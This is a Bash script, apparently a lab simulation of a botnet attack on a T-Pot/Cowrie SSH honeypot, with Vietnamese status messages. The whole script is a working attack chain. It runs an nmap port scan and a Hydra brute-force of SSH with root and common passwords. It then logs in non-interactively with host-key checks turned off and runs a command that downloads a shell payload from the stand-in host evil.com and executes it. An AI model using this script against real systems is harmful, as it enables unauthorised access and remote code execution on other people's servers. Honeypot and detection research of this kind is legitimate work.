#!/usr/bin/env bash
set -euo pipefail

TPOT_IP="${1:-}"
KALI_IP="${2:-}"
TPOT_PORT="${3:-${TPOT_PORT:-22}}"

usage(){ echo "Usage: $0 <T-POT_IP> <KALI_IP> [TPOT_PORT]"; exit 1; }
[[ -z "${TPOT_IP}" || -z "${KALI_IP}" ]] && usage

say(){ printf "%s\n" "$*"; }

say "[*] Quét cổng SSH ${TPOT_IP}:${TPOT_PORT} ..."
nmap -sT -Pn -p "${TPOT_PORT}" "${TPOT_IP}" || true

say "[*] Chuẩn bị danh sách user/pass ..."
USERS="$(mktemp)"
PWDS="$(mktemp)"
cat > "${USERS}" <<'EOF'
root
EOF
cat > "${PWDS}" <<'EOF'
root
admin
123456
password
pass
EOF

say "[*] Brute-force bằng Hydra ..."
HYDRA_OUT="$(mktemp)"
hydra -L "${USERS}" -P "${PWDS}" -t 4 -V -f -o "${HYDRA_OUT}" "ssh://${TPOT_IP}" -s "${TPOT_PORT}" || true

USER_FOUND="$(awk '/\[ssh\] host:/ && /login:/ && /password:/ {for(i=1;i<=NF;i++){if($i=="login:"){u=$(i+1)}; if($i=="password:"){p=$(i+1)}}; if(u!="" && p!=""){print u; exit}}' "${HYDRA_OUT}" || true)"
PASS_FOUND="$(awk '/\[ssh\] host:/ && /login:/ && /password:/ {for(i=1;i<=NF;i++){if($i=="login:"){u=$(i+1)}; if($i=="password:"){p=$(i+1)}}; if(u!="" && p!=""){print p; exit}}' "${HYDRA_OUT}" || true)"

if [[ -n "${USER_FOUND}" && -n "${PASS_FOUND}" ]]; then
  USER="${USER_FOUND}"
  PASS="${PASS_FOUND}"
  say "[+] Dùng cred: ${USER} / ${PASS}"
else
  say "[!] Hydra KHÔNG tìm thấy cred → dùng mặc định LAB: root / admin"
  USER="root"
  PASS="admin"
fi

REMOTE_CMD='cd /tmp; wget http://evil.com/payload.sh; chmod +x payload.sh; sh payload.sh'

say "[*] SSH vào Cowrie & chạy payload (wget) ..."
set +e
sshpass -p "${PASS}" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  -o ConnectTimeout=8 \
  -o ServerAliveInterval=5 \
  -o ServerAliveCountMax=2 \
  -p "${TPOT_PORT}" \
  -tt "${USER}@${TPOT_IP}" "${REMOTE_CMD}"
SSH_RC=$?
set -e

if [[ ${SSH_RC} -ne 0 ]]; then
  say "[!] SSH/Payload lỗi (mã: ${SSH_RC}). Kiểm tra trực tiếp từ container Cowrie:"
  say "    docker exec -it cowrie sh -lc 'wget -qO- http://evil.com/payload.sh | head'"
  exit 3
fi

say "[+] Hoàn tất mô phỏng botnet."
rm -f "${USERS}" "${PWDS}" "${HYDRA_OUT}" || true
exit 0
